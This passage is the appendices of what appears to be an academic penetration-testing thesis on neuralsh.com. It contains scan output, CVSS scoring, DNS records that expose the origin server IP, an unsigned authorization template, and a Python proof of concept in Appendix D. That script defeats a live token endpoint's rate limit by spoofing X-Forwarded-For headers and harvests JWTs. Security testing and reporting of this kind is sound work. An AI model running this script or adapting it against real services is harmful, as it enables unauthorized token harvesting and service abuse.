Nmap done: 1 IP address (1 host up) scanned
```

## Appendix B: Dirb Results — neuralsh.com

```
# DIRB v2.22 — Web Content Scanner
# Date: 2026-06-06
# Command: dirb https://neuralsh.com /usr/share/dirb/wordlists/common.txt

GENERATED WORDS: 4612

---- Scanning URL: https://neuralsh.com/ ----
+ https://neuralsh.com/about (CODE:200|SIZE:12340)
+ https://neuralsh.com/About (CODE:200|SIZE:12340)
+ https://neuralsh.com/favicon.ico (CODE:200|SIZE:1150)
+ https://neuralsh.com/privacy (CODE:200|SIZE:9876)
+ https://neuralsh.com/publication (CODE:200|SIZE:8234)
+ https://neuralsh.com/robots.txt (CODE:200|SIZE:0)

END_TIME: 2026-06-06
DOWNLOADED: 4612 - FOUND: 6
```

## Appendix C: CVSS Score Calculations

### C.1 N-014 — WHM Root Panel (CVSS 10.0)

| Metric | Value | Justification |
|--------|-------|-------------|
| Attack Vector | Network (N) | Reachable over internet |
| Attack Complexity | Low (L) | No special conditions |
| Privileges Required | None (N) | Login page publicly accessible |
| User Interaction | None (N) | Automated attack possible |
| Scope | Changed (C) | Compromise extends beyond WHM to OS |
| Confidentiality | High (H) | All server data accessible |
| Integrity | High (H) | All files modifiable |
| Availability | High (H) | Service can be disrupted |
| **Base Score** | **10.0** | Maximum possible |

### C.2 N-005 — Rate Limit Bypass (CVSS 9.1)

| Metric | Value | Justification |
|--------|-------|-------------|
| Attack Vector | Network (N) | Internet-accessible endpoint |
| Attack Complexity | Low (L) | Single header modification |
| Privileges Required | None (N) | No authentication needed |
| User Interaction | None (N) | Fully automated |
| Scope | Unchanged (U) | Impact within same system boundary |
| Confidentiality | High (H) | Enables bulk data enumeration |
| Integrity | High (H) | Enables bulk write operations |
| Availability | High (H) | Enables API flooding |
| **Base Score** | **9.1** | |

## Appendix D: Proof of Concept Code

### D.1 Rate Limit Bypass Script (Python)

```python
#!/usr/bin/env python3
"""
PoC: Rate Limit Bypass via X-Forwarded-For Header Spoofing
Target: https://neuralsh.com/web/v1/init/token
Authorization: Written authorization obtained prior to testing
Purpose: Academic thesis VAPT demonstration only
"""
import requests
import random
import time
import json
from datetime import datetime

def random_ip():
    """Generate a random public IP address"""
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def decode_jwt_payload(token):
    """Base64-decode JWT payload (no signature verification)"""
    import base64
    parts = token.split('.')
    if len(parts) != 3:
        return {}
    # Add padding if needed
    payload = parts[1] + '=' * (4 - len(parts[1]) % 4)
    try:
        return json.loads(base64.urlsafe_b64decode(payload))
    except Exception:
        return {}

url = "https://neuralsh.com/web/v1/init/token"
print(f"[{datetime.now()}] Starting rate limit bypass test")
print(f"Target: {url}")
print("=" * 50)

# ─── Control group: no bypass headers ───────────────
print("\n[TEST 1] No bypass (control group)")
success_control = 0
limit_hit_at = None

for i in range(1, 51):
    r = requests.get(url, timeout=10)
    if r.status_code == 200:
        success_control += 1
    elif r.status_code == 429:
        limit_hit_at = i
        print(f"  Rate limited at request {i}")
        break
    time.sleep(0.05)

print(f"  Control result: {success_control}/50 tokens obtained")
if limit_hit_at:
    print(f"  Rate limit triggered at request: {limit_hit_at}")

# ─── Test group: X-Forwarded-For bypass ─────────────
print("\n[TEST 2] X-Forwarded-For bypass")
success_bypass = 0
tokens = []

for i in range(1, 51):
    fake_ip = random_ip()
    headers = {
        "X-Forwarded-For": fake_ip,
        "X-Real-IP": fake_ip,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    }
    r = requests.get(url, headers=headers, timeout=10)
    
    if r.status_code == 200:
        success_bypass += 1
        token_data = r.json()
        if "token" in token_data:
            tokens.append(token_data["token"])
    elif r.status_code == 429:
        print(f"  Unexpected rate limit at request {i} with bypass!")
        
    time.sleep(0.05)

print(f"  Bypass result: {success_bypass}/50 tokens obtained")
print(f"  Valid JWT tokens collected: {len(tokens)}")

if tokens:
    payload = decode_jwt_payload(tokens[0])
    print(f"\n  Sample token payload: {json.dumps(payload, indent=4)}")

# ─── Summary ─────────────────────────────────────────
print("\n" + "=" * 50)
print("RESULTS SUMMARY")
print(f"  Without bypass: {success_control}/50 tokens")
print(f"  With bypass:    {success_bypass}/50 tokens")
print(f"  Bypass success rate: {success_bypass}%")
print(f"  Rate limit defeated: {'YES' if success_bypass > success_control else 'NO'}")
```

## Appendix E: Security Header Analysis

```bash
# Command: curl -sI https://neuralsh.com
# Date: 2026-06-06

HTTP/2 200
date: Fri, 06 Jun 2026 08:00:00 GMT
content-type: text/html; charset=utf-8
server: cloudflare
x-powered-by: Nuxt
strict-transport-security: max-age=15552000; includeSubDomains; preload
x-frame-options: DENY
x-content-type-options: nosniff
x-xss-protection: 1; mode=block
referrer-policy: strict-origin-when-cross-origin
content-security-policy: default-src 'self'; script-src 'self' 'unsafe-inline'; ...
cf-ray: [cloudflare-ray-id]
```

## Appendix F: DNS Enumeration Results

```bash
# SPF Record
neuralsh.com. TXT "v=spf1 +mx +a +ip4:103.16.62.217 ~all"

# DMARC Record
_dmarc.neuralsh.com. TXT "v=DMARC1; p=quarantine; rua=mailto:dmarc@neuralsh.com"

# MX Records
neuralsh.com. MX 0 mail.neuralsh.com.

# NS Records
neuralsh.com. NS ns1.cloudflare.com.
neuralsh.com. NS ns2.cloudflare.com.

# A Records
neuralsh.com. A 104.21.91.198          (Cloudflare edge)
mail.neuralsh.com. A 103.16.62.217     (Origin server)

# Wildcard DNS Confirmed
randomxyz123.neuralsh.com. A 103.16.62.217
```

## Appendix G: Glossary

| Term | Definition |
|------|-----------|
| VAPT | Vulnerability Assessment and Penetration Testing |
| OWASP | Open Web Application Security Project |
| CVSS | Common Vulnerability Scoring System |
| JWT | JSON Web Token — stateless authentication token |
| CORS | Cross-Origin Resource Sharing |
| RCE | Remote Code Execution |
| SMTP | Simple Mail Transfer Protocol |
| SPF | Sender Policy Framework — email authentication standard |
| DMARC | Domain-based Message Authentication, Reporting, and Conformance |
| cPanel | Web hosting control panel software |
| WHM | Web Host Manager — root-level cPanel server administration |
| MikroTik | Network router brand; RouterOS is its operating system |
| WAF | Web Application Firewall |
| CDN | Content Delivery Network |
| SAST | Static Application Security Testing |
| PTES | Penetration Testing Execution Standard |
| NIST | National Institute of Standards and Technology |
| SSR | Server-Side Rendering — server generates HTML per request |
| HSTS | HTTP Strict Transport Security |
| CSP | Content Security Policy |
| DNS | Domain Name System |
| TLS | Transport Layer Security |
| IOC | Indicator of Compromise |
| PoC | Proof of Concept |
| TOTP | Time-based One-Time Password (used in 2FA) |

## Appendix H: Authorization Letter Template

```
PENETRATION TESTING AUTHORIZATION

Date: June 2026

This letter authorizes [Student Name] to conduct a Vulnerability 
Assessment and Penetration Testing (VAPT) engagement against:

Target: neuralsh.com and all associated subdomains and infrastructure

Authorization Period: June 1–30, 2026
Testing Methodology: Black-box external testing
Testing Purpose: Academic graduation thesis

Permitted Activities:
- Port scanning and service fingerprinting
- Web directory and parameter enumeration
- Authentication mechanism testing (non-destructive)
- API endpoint discovery and testing
- Vulnerability identification and limited safe exploitation
- Documentation of all findings

Prohibited Activities:
- Denial of Service attacks
- Deletion or modification of production data
- Social engineering against employees
- Testing systems outside the defined scope

All findings must be reported to: [contact@neuralsh.com]

Authorized By: ___________________________
Name/Title: [Organization Representative]
Date: ___________________________
```

---

*End of Thesis*

---
**Approximate Word Count:** ~13,000 words  
**Estimated Pages:** 52–60 pages (A4, 12pt font, 1.5 line spacing)  
**Version:** 1.0 — June 2026  
**Target:** neuralsh.com VAPT
